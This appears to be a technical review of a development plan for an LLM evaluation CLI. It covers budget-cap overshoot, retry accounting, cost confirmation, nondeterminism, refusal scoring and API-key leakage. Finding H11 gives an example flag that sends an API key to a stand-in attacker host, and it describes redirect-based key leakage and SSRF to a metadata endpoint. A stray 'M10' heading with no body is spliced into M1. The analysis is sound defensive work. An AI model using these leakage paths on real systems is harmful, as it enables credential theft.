## HIGH

### H1 — §2.3 claims the estimate "can only be too high." It contradicts itself two sentences later, and the guard has no settlement-time ceiling.

§2.3: *"Deliberately pessimistic: an estimate that can only be too high can only cause the guard to refuse early."* Then: *"the input count can differ from the local count routinely (tokenizer drift, injected system prompts, tool schemas)."* Both cannot be true. A BPE approximation under-counts input on non-English text, code, and long tool schemas; every under-count is an under-reservation.

Concretely: cap $5.00, concurrency 8. `Guard.fitsLocked` (`stats/budget/budget.go`) checks `spent + reserved + est > limit` **only at reservation**. `Reservation.Settle` adds `actual` to `spent` with no cap check whatsoever. `remainingLocked` clamps with `max(0, …)`, so a Guard that has blown its cap reports `Remaining: 0`, never a negative — the overshoot is not merely unenforced, it is **unobservable**. At the moment the last authorization is granted, `spent+reserved ≤ cap`; the 8 in-flight calls then each settle at `est + δ_i`. Final spend ≤ `cap + Σδ_i` over in-flight calls. That bound is real and the plan never states it.

**Fix:** state the bound explicitly (`cap + concurrency × max-per-call-underestimate`) as the honest contract, mirror it to the ledger, and record signed overshoot at settlement (`Reservation.Estimate()` already exists, so this needs no Guard API change to compute — only to report).

### H2 — §7's property test asserts an invariant §6 says will be violated, and as specified it is unfalsifiable.

§7: *"the reservation is never below the settled cost for any input in the generated space."*
§6, row 2: *"Reported usage exceeds the reservation | Settle at actual."*

The plan states the invariant and its own violation in the same document. Worse, a property test where the harness generates both the estimate *and* the "actual" proves nothing about a provider's tokenizer — the only thing that can violate the property in production is exactly the thing the generator cannot model. The test passes by construction.

**Fix:** two tests, neither of which is the one specified. (a) A bounded-overshoot property: `settled ≤ reservation × multiplier` where the generator draws "actual" from **recorded provider usage blocks**, not from the estimator's own model. (b) A cap test whose assertion is `total_spend ≤ cap + concurrency × maxΔ`, with maxΔ a declared constant, not `total_spend ≤ cap`.

### H3 — Retries live in two layers; the transport layer's retries take no budget reservation, and `spendOf` hardcodes `Calls: 1`.

§2.1 gives the shared transport *"retries, `Retry-After` parsing"*. §2.6 says *"Each retry attempt takes its own budget reservation, which M1 already implemented."* Both cannot hold. `core.invokeWithRetry` reserves per attempt; a transport that retries internally makes N provider calls inside **one** reservation.

And the accounting cannot recover: `core/baseline.go:644-650`

```go
func spendOf(r *knov1.Response) budget.Spend {
	return budget.Spend{
		Calls:         1,
```

Three provider calls behind one transport retry settle as one call. With `--max-calls 1000` and a transport `MaxAttempts` of 3, a throttled run makes up to 3000 provider calls against a 1000-call cap. This is a direct prime-directive-4 breach introduced by the plan, not inherited.

**Fix (preferred):** the transport classifies and returns `ErrRateLimited` carrying the parsed `Retry-After`; it does **not** retry. `core` owns retry, reservation, and backoff, and consumes the hint. Alternative (worse): the transport reports attempt count on `Response`, `spendOf` reads it — that is a proto change and must land in the first diff.

### H4 — Confirmation is per-operation. The human consents to one Case's price and pays for the whole run.

DESIGN.md §"Cost model": *"the CLI prints an estimate and confirms before any run over threshold."* What exists is per-operation: `ConfirmFunc(ctx, est Estimate, rem Remaining)` receives one call's estimate, and `Guard.askOnce` sets `g.confirmed = true` **once, for the life of the run**. Under M1 this was harmless because `EstCostPerCallUSDMicros` was one constant. Under §2.3 the estimate varies per Case, so the human sees whichever Case happened to cross the threshold first.

Sequence: 10,000 dev Cases, per-Case estimate $0.04, threshold $0.01. The first Case prompts with `$0.04`. The user types `y`. The run spends $400 and never asks again. Prime directive 4 requires *estimate + confirm*; what M2 ships is *sample + confirm*.

**Fix:** compute a run-level estimate before dispatch (`DevCases × per-Case estimate`, which the CLI already has `counts.Dev` for at `cli/baseline.go`) and confirm on **that**. Keep per-operation `Authorize` for enforcement. This is a `core`/`cli` change the PR table does not name.

### H5 — Nothing pins provider nondeterminism, and `checkResumable` cannot see a model alias moving underneath it.

The plan never mentions `temperature`, `top_p`, `seed`, or model-alias resolution. OpenAI Chat Completions defaults to `temperature: 1`. Two `kno baseline` runs on the same evals and the same model produce different baselines — and §1 calls this stage *"the reference every later delta is measured against."*

Worse, resume: `core/baseline.go:368`

```go
case run.GetAgent().GetRef() != o.AgentRef.GetRef():
```

`openai:gpt-4.1` is a moving pointer. A run interrupted Monday and resumed Friday after the alias re-points passes this check cleanly and blends two models into one `AggregateScore` — precisely the failure `checkResumable`'s own godoc (lines 346-357) says it exists to prevent: *"silently blends Cases scored under two different agents into one AggregateScore and presents it as a single homogeneous number."*

**Fix:** default `temperature: 0` (and `seed` where supported), record both on the `Run`; capture the provider-reported resolved model (`response.model`, and `system_fingerprint` where offered) on first response and fold it into the resume check — or at minimum warn loudly. Document in `what-the-numbers-mean.md` that a baseline is reproducible only to the extent the provider is.

### H6 — Scoring content-filter refusals silently converts a broken run into a clean baseline of 0.0.

§6: *"The provider answered — this is a scored Case with a low score, not an error."* Take that literally with `exactmatch`: an account whose safety settings refuse every Case produces 100% scored Cases, `AggregateScore = 0.000`, and **passes** `DefaultMaxErrorRate` (`core/baseline.go:24`, 0.05) because zero Cases errored. `cli/render.go:130-145` `warningsFor` emits nothing. The user gets a confident-looking reference number produced by a run in which the agent was never measured.

Second-order: refusals are provider policy and are nondeterministic. A refusal present in the baseline and absent in a later Value run reads as an improvement attributable to the injected Asset. That is a confound the plan's own framing ("Getting this backwards biases the baseline") half-notices and then resolves in the direction that hides it.

**Fix:** score it *and* mark it — a refusal flag on `Response`, a refusal count on the `Run`, a warning above a threshold, and a stated rule that refused Cases are excluded from (or flagged in) every later delta. Neither "score it" nor "error it" alone is correct; the distinction has to survive to `Valuation`.

### H7 — Truncation by `finish_reason` is missing entirely, and it is coupled to the cost estimate.

§6's only truncation row is *"Mid-stream deadline / partial read."* That covers transport failure. It does not cover `finish_reason: "length"` / `stop_reason: "max_tokens"`: a well-formed HTTP 200 with valid JSON and a truncated answer. Under the plan that gets scored as a wrong answer — meaning **Kno's own choice of `max_output_tokens` depresses the baseline**, and the user has no way to see it.

The coupling makes it worse: `max_output_tokens` is also the ceiling in §2.3's estimate. Raising it to stop truncating inflates every reservation (see H8); lowering it to loosen the cap truncates more answers. The plan sets one knob against two objectives without noticing.

**Fix:** treat a length-stop as a distinct outcome (errored, or scored-and-flagged, but recorded either way), record `max_output_tokens` on the `Run`, and include it in `InputFingerprint` so a resume with a different ceiling is refused.

### H8 — The pessimistic estimate makes `--max-cost-usd` unusable, and the user's rational response is to disable it.

Worked: output priced at $8/Mtok, `max_output_tokens = 4096` → **$0.0328 reserved per Case**, regardless of whether the actual answer is 40 tokens costing $0.0003. With `--max-cost-usd 5.00`, the guard authorizes ~152 Cases and stops `BUDGET_STOPPED` having actually spent ~$0.30 — 6% of the cap. On a reasoning model with a 32k output budget it is an order of magnitude worse.

The user sees a run that halts at 6% of its budget, and the only lever is to raise the cap ~20x. A guard that trains users to set caps 20x above their intent is a worse guard than no guard, and §2.3 never mentions this cost of pessimism.

**Fix:** keep the first *k* Cases pessimistic, then reserve at a high quantile (p95) of observed settled cost × safety multiplier, refreshed as the run proceeds. Report reserved-vs-settled in the run summary so a budget stop is explicable. Keep the pessimistic path as a `--strict-estimate` mode.

### H9 — `make record-fixtures` is the one live spend path in the repo with no cap, and the plan makes it load-bearing.

`Makefile:198-200`:

```make
record-fixtures:
	@KNO_RECORD_FIXTURES=1 KNO_LIVE_TESTS=1 go test -tags=integration -run TestRecord ./adapters/...
```

It sets `KNO_LIVE_TESTS=1` itself and never checks `KNO_MAX_COST_USD`, so it walks straight past the interlock at `Makefile:167-175` that `make test-live` enforces (*"refusing to run without KNO_MAX_COST_USD set"*). §2.5 and §7 and PR M2-3 all depend on this target, and none of them notice. Today it spends nothing because no adapter has a `TestRecord`; M2-3 is the PR that arms it.

**Fix:** `record-fixtures` must require `KNO_MAX_COST_USD`, and recording must run through `budget.Guard` with a hard call cap. Add this to `make selftest`'s eventual list (debt 16) — a gate that has never been seen to fail is not a gate.

### H10 — §10 omits two ledger entries whose triggers name M2 explicitly.

`docs/debt.md#20`: *"Revisit if a provider offers an idempotency key that can be persisted before the call — **M2, with the first real adapter**."*
`docs/debt.md#21`: *"**When the second stage lands (M2)**: consider making the raw adapter constructor unexported outside its package…"*

Neither appears in §10, which presents itself as *"Debt coming due at M2."* CLAUDE.md: *"Silent carryover is not an option."* A table that claims completeness and is incomplete is worse than no table — it is the mechanism by which a trigger becomes "someday" without anyone deciding it.

20 is substantive, not clerical: at least one of the two targeted providers accepts an idempotency header on requests. If a key can be generated and persisted **before** the call, part of the dark-spend window (`debt.md#20`, named as irreducible in the M1 plan) closes for the first time. That is a genuine M2 deliverable the plan discards by omission.

**Fix:** add rows for 20 and 21 with dispositions. For 20, verify per-provider idempotency support and either repay or record the finding with a reason.

### H11 — The base-URL mitigation covers plain HTTP and misses the two ways the key actually leaks.

§6: *"Base-URL override pointing at plain HTTP | Refuse unless explicitly opted in."* That is necessary and insufficient.

1. **HTTPS to an attacker host.** `--agent openai-compat:m@https://evil.example.com/v1` sends `OPENAI_API_KEY` over a perfectly valid TLS connection to an attacker. Confidentiality in transit is not the threat; destination is.
2. **Cross-host redirect leaks the Anthropic key even from a trusted base URL.** Go's `net/http` strips only `Authorization`, `WWW-Authenticate`, and `Cookie` on a cross-domain redirect. Anthropic authenticates with **`x-api-key`**, which is not on that list. Any base URL — including a compromised or misconfigured trusted one — that returns a 302 to an attacker host forwards the Anthropic key verbatim. The user did nothing wrong and there is no plain-HTTP hop to refuse.

Also unaddressed: a base URL pointing at `169.254.169.254`, `localhost`, or an RFC1918 address (SSRF from a CI runner with an instance-metadata endpoint), and `HTTPS_PROXY` being honored by the default transport.

**Fix:** (a) a `CheckRedirect` that refuses cross-host redirects outright — an API endpoint has no legitimate need to redirect you elsewhere; (b) bind each key env var to a default-host allowlist, and require an explicit opt-in flag (or a differently-named env var) to send a key to a non-default host; (c) refuse loopback/link-local/RFC1918 base URLs unless opted in. This belongs in M2-1, and `SECURITY.md` (§9 already lists it) must describe the actual rule.

## MEDIUM

### M1 — §2.5 protects keys and forgets that fixtures are customer data.

CLAUDE.md: *"Traces are customer data."* `store/store.go` repeats it: *"Response.output may contain end-user conversation content."* Recorded fixtures contain **both** the Case input sent and the provider response returned, committed to the repo forever. §2.5 discusses only keys.

And denylist scrubbing is the wrong shape: it can only remove patterns someone anticipated (`sk-…` matches; an org header, a project ID, a session cookie, a self-hosted or OpenRouter key format may not). The failure mode is silent and permanent — `Makefile:190-195` runs gitleaks over the working tree **and git history**, so a key that lands means rewriting history *and* revoking, and the plan has no runbook for that.

**Fix:** allowlist, not denylist — assert that a fixture contains no `Authorization`/`x-api-key`/`Cookie` header field **at all** (absence, not redaction), and record fixtures against a synthetic Case corpus checked into `testdata/`, never a user's evals. ### M10 — The pricing model cannot settle correctly for any provider with prompt caching, and errs high.

## Verified as correct — do not re-litigate

- **The §0 split itself is defensible.** "The first milestone that spends real money should not also be the first milestone with a new pipeline stage" is a sound sequencing argument, and the plan is honest that DESIGN.md bundles them. My objections are to two of its *supporting* arguments, not the conclusion: (a) Alternative B's rejection reason — *"a single adapter cannot validate that the Ring-0 `Agent` interface is actually provider-neutral"* — is weak, because M2 exercises only `Invoke`; the interface surface that actually stresses provider-neutrality is `ContextInjector`/`WithContext`, which M2 never touches. Two adapters implementing one method proves less than the plan claims. (b) The split's unmentioned cost is the TUI (M9). The conclusion survives both.
- **Alternative A's rejection is correct and verifiable.** `fake.Invoke` returns `c.GetExpected()` by default (`adapters/agent/fake/fake.go`), so `value` against the fake would indeed measure nothing.
- **Alternatives C, D, E** — approximate tokenizer over vendored ones, no runtime pricing fetch, static capability matrix over probing. All three reasoned correctly, and D's *"a network dependency on the spend path whose failure mode is either 'refuse to run' or 'run with no cap'"* is exactly right.
- **"Unknown model with a cost cap set is a refusal, not a zero estimate."** Correct, and it is the actual fix for the M1 overshoot that §1 cites.
- **Keys from env or keychain only, never `kno.yaml`, never a flag.** Correct, including the shell-history reasoning.
- **The Guard's concurrency accounting is sound and needs no change.** `tryReserve` takes a single lock acquisition, `fitsLocked` counts outstanding reservations, `askOnce` singleflights the prompt with `g.mu` released. The comment at `budget.go` records that the split-lock version was caught authorizing 14 operations against a cap of 10. M2's cap risk (H1) comes from estimate accuracy, not from the guard's mechanics.
- **`Restore` before `Authorize` on resume** (`core/baseline.go`, `Guard.Restore`) is correct and already tested; the adapter work does not disturb it.
